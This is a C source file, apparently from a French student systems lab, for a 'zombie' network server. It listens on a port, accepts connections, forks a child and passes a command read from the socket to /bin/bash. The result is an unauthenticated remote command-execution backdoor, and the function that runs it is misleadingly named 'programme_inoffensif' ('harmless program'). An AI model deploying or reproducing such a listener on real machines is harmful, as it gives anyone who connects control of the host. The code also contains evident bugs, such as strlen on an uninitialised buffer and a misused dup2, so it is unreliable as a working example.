#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>
#include <string.h>

#include "utils_v2.h"
#include "info.h"

volatile sig_atomic_t end = 0;

int initSocketZombie(int port)
{
  int sockfd = ssocket();
  sbind(port,sockfd);
  slisten(sockfd,5);
  return sockfd;
}

int choisirPort(){
    int port = 5001; // A FAIRE POUR QUE CE SOIT AU HASARD
    /*
      for (int i = 0; i < NUM_PORTS; i++) {
        printf("%d\n", PORTS[i]);
        //chosir un port au hasard (a faire)
    }
    */
    printf("Port choisi : %d\n", port);
    return port;
}

void EndZombieHandler(int num){
    end = 1;
}

void programme_inoffensif(void* newsockfdd) {
    int* newsockfd = newsockfdd;
    char commande[256];

    int fd = sread(*newsockfd,commande,strlen(commande));

    dup2(fd,0);

    sexecl("/bin/bash", "bash", commande, (char *) NULL);

}

int main(int argc, char *argv[]){
    int port;

    if(argv[1] == NULL){
        port = choisirPort();
    }else{
        port = atoi(argv[1]);
    }
    
    int sockfd = initSocketZombie(port);

    while(!end){
        // attend une connexion
        printf("En attente de connexion\n");
        int newsockfd = saccept(sockfd);
        printf("Connexion établie\n");

        int pid_zombie = fork_and_run1(programme_inoffensif, &newsockfd);

        /* Attente de la terminaison du processus fils */
        int status;
        swaitpid(pid_zombie, &status, 0);
        sclose(newsockfd);
    }

    return 0;
    
}